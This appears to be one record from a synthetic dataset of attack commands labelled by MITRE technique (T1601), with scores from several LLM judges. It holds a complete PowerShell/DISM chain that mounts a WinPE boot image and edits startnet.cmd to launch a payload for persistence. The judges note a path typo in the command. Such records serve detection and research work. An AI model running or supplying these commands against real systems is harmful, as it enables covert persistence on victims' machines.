@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\boot.wim /Index:2 /MountDir:C:\\Mount\\Boot; Add-Content -Path C:\\Mount\\Boot\\Windows\\System32\\startnet.cmd -Value 'start \"\" X:\\Windows\\System\\32\\malicious.exe'; dism /Unmount-Wim /MountDir:C:\\Mount\\Boot /Commit; Get-FileHash C:\\Images\\boot.wim -Algorithm SHA256; fc /b C:\\Images\\boot_clean.wim C:\\Images\\boot.wim",
+  "explanation": "Patches the Windows PE boot image by altering startnet.cmd to launch a payload, then verifies the integrity shift through hashing and binary diff.",
+  "rationale_steps": [
+    "Mount boot.wim index 2 (WinPE) with DISM.",
+    "Modify startup script to persist a payload within the system image.",
+    "Commit changes and unmount to save the patched boot image.",
+    "Verify modifications via checksum and fc binary comparison."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-596528e3",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are correctly separated by semicolons with valid DISM and PowerShell parameter syntax and balanced quoting for the embedded start command.",
+        "semantic_score": 4,
+        "semantic_justification": "It properly mounts and modifies a boot WIM to alter startnet.cmd and commits changes with integrity checks, but the payload path uses 'System\\32' instead of 'System32' and the claim of no required privileges is unrealistic for DISM operations.",
+        "combined_score": 4.5,
+        "confidence": 0.84,
+        "timestamp": "2025-10-02T18:13:55.747432Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command chain is well-formed with valid DISM flags, proper PowerShell cmdlet syntax, and correct semicolon separators, though the path 'X:\\Windows\\System\\32\\malicious.exe' contains a typo ('System\\32' instead of 'System32') that would cause the payload reference to be incorrect.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by mounting a WIM boot image, injecting a malicious executable launch into startnet.cmd (which executes during Windows PE boot), committing the modified image, and then performing integrity verification via SHA256 hashing and binary diff to confirm the tampered image differs from the clean baseline.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T01:17:13.038316Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command sequence uses valid PowerShell separators, standard DISM flags, and correctly formatted cmdlets.",
+        "semantic_score": 5,
+        "semantic_justification": "The logic of mounting a WIM, injecting a startup script command, and committing changes perfectly demonstrates the technique of modifying a system image.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:17:16.217953Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
